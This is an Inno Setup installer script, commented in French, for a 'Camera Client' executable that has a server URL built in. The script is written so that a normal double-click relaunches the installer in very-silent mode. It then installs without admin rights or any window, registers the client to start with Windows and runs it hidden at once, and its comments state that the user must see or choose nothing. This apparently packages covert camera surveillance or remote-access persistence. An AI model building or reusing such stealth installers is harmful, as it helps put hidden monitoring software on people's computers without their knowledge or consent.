; Installateur Windows du client caméra — 100 % silencieux, sans saisie.
; Nécessite Inno Setup (gratuit) : https://jrsoftware.org/isinfo.php
; Compilation : ISCC packaging\windows\installer.iss
; (le script build_windows.bat le fait automatiquement s'il trouve ISCC)
;
; Le résultat, CameraClient-Setup.exe, ne nécessite PAS Python sur la
; machine de l'utilisateur : dist\CameraClient.exe (fabriqué par
; PyInstaller) embarque déjà tout l'interpréteur ET l'URL du serveur
; (voir embedded_config.py, généré par build_windows.bat).
;
; Comportement : un simple double-clic sur CameraClient-Setup.exe
;   - n'affiche AUCUNE fenêtre (il se relance lui-même en mode très silencieux) ;
;   - installe le client dans le profil de l'utilisateur (pas d'admin requis) ;
;   - active le démarrage automatique avec Windows ;
;   - lance le client immédiatement, en arrière-plan, sans fenêtre.
; Les options /VERYSILENT, /SUPPRESSMSGBOX, /NORESTART restent acceptées
; (déploiement par script, GPO...), mais ne sont plus nécessaires.
;
; IMPORTANT : ce script vit dans packaging\windows\, PAS dans build\windows\.
; build\ est l'espace de travail de PyInstaller (il est nettoyé/recréé à
; chaque build avec --clean) : tout fichier qui y vivrait serait supprimé.

#define MyAppName "Camera Client"
#define MyAppVersion "1.0"
#define MyAppExeName "CameraClient.exe"

[Setup]
; AppId unique : ne changez jamais cette ligne, sinon les mises à jour
; s'installeront côte à côte au lieu de remplacer l'ancienne version.
AppId={{2F2C5B3E-7A1D-4B7A-9B2E-CAMERACLIENT1}}
AppName={#MyAppName}
AppVersion={#MyAppVersion}
AppPublisher=Selon Randriavao
DefaultDirName={autopf}\{#MyAppName}
; Pas de page de choix du dossier, pas de page de bienvenue, pas de page
; « prêt à installer » : l'utilisateur ne doit RIEN voir ni choisir.
DisableProgramGroupPage=yes
DisableWelcomePage=yes
DisableDirPage=yes
DisableReadyPage=yes
DisableFinishedPage=yes
; Installation dans le profil utilisateur, sans UAC (pas d'admin requis).
PrivilegesRequired=lowest
; Un seul installateur à la fois : évite les doubles lancements concurrents.
SetupMutex=Global\CameraClientSetupMutex
ArchitecturesInstallIn64BitMode=x64compatible
OutputDir=..\..\releases
OutputBaseFilename=CameraClient-Setup
Compression=lzma
SolidCompression=yes
UninstallDisplayIcon={app}\{#MyAppExeName}
; Écran de désinstallation : on garde la fenêtre standard (l'utilisateur
; DOIT voir ce qu'il désinstalle), mais sans page de confirmation inutile.
UninstallDisplayName={#MyAppName}

[Languages]
Name: "english"; MessagesFile: "compiler:Default.isl"

[Files]
Source: "..\..\dist\{#MyAppExeName}"; DestDir: "{app}"; Flags: ignoreversion

[Icons]
; Démarrage automatique avec la session Windows (toujours activé).
Name: "{userstartup}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"

[Run]
; Lancement immédiat, en arrière-plan, y compris en mode silencieux
; (pas de « skipifsilent », sinon le client ne démarrerait qu'à la prochaine session).
Filename: "{app}\{#MyAppExeName}"; Flags: nowait runhidden runasoriginaluser

[UninstallRun]
Filename: "{sys}\taskkill.exe"; Parameters: "/F /IM {#MyAppExeName}"; Flags: runhidden; RunOnceId: "StopCameraClient"

[UninstallDelete]
Type: filesandordirs; Name: "{localappdata}\CameraClient"

[Code]
{ ---------------------------------------------------------------------------
  Relance automatique en mode silencieux au double-clic.

  Principe :
   - Si l'utilisateur a déjà passé /VERYSILENT (ou /SILENT) sur la ligne de
     commande, on ne fait RIEN : l'installateur continue normalement.
   - Sinon (double-clic normal), on relance CE MÊME exécutable avec
     /VERYSILENT, en ATTENDANT sa fin (ewWaitUntilTerminated), puis on quitte
     sans rien afficher.

  Pourquoi ewWaitUntilTerminated et pas ewNoWait :
   Avec ewNoWait, le processus parent meurt immédiatement après avoir lancé
   l'enfant. Windows peut alors avorter le lancement de l'enfant (le processus
   parent n'a pas fini son initialisation), et l'utilisateur ne voit RIEN se
   passer — c'était exactement le bug du double-clic.
   En attendant la fin de l'enfant, le parent reste vivant, l'enfant
   s'initialise correctement, et le parent quitte une fois l'enfant terminé.

  Pourquoi ShellExec et pas Exec :
   ShellExec passe par ShellExecuteEx, qui gère mieux le relancement d'un
   exécutable depuis lui-même (pas de conflit de handle de fichier).
  --------------------------------------------------------------------------- }
function InitializeSetup(): Boolean;
var
  ResultCode: Integer;
  Params: String;
begin
  Result := True;

  { Double-clic normal : on se relance en mode très silencieux, en attendant
    la fin, puis on quitte. }
  if not WizardSilent then
  begin
    { On propage /LOG si l'utilisateur en a passé un, pour qu'il puisse
      diagnostiquer en cas de problème. Par défaut, on n'ajoute PAS de /LOG
      (le mode silencieux n'écrit rien, c'est voulu). }
    Params := '/VERYSILENT /SUPPRESSMSGBOX /NORESTART';
    if Pos('/LOG', UpperCase(GetCmdTail)) > 0 then
    begin
      { Reprise simple : on relance avec le même /LOG, sans chercher à
        parser finement (le /LOG de l'utilisateur est déjà bien formé). }
      Params := Params + ' /LOG="' + ExpandConstant('{tmp}') + '\CameraClient-Setup.log"';
    end;

    if not ShellExec('', ExpandConstant('{srcexe}'), Params, '',
                     SW_HIDE, ewWaitUntilTerminated, ResultCode) then
    begin
      { Si la relance échoue (très rare : antivirus, politique), on laisse
        l'installateur continuer normalement plutôt que de tout bloquer. }
      Result := True;
      Exit;
    end;

    { L'enfant a terminé : on quitte sans rien afficher. }
    Result := False;
  end;
end;

{ Mise à jour : arrête l'ancienne instance du client pour pouvoir remplacer
  le .exe pendant l'installation. }
function PrepareToInstall(var NeedsRestart: Boolean): String;
var
  ResultCode: Integer;
begin
  Exec(ExpandConstant('{sys}\taskkill.exe'), '/F /IM {#MyAppExeName}', '',
       SW_HIDE, ewWaitUntilTerminated, ResultCode);
  Result := '';
end;